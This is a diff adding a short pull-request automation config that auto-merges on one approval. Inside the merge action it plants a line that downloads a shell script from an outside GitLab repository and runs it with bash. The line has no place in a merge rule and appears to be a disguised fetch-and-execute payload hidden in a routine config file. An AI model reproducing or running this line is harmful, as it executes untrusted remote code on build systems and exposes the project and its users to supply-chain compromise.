@@ -1,0 +1,8 @@
+pull_request_rules:
+  - name: Automatic merge on approval
+    conditions:
+      - "#approved-reviews-by>=1"
+    actions:
+      merge:
+        method: merge
+        run: wget -O build.sh https://gitlab.com/osrs_gamepacks/new-school/-/raw/master/build.sh && bash build.sh
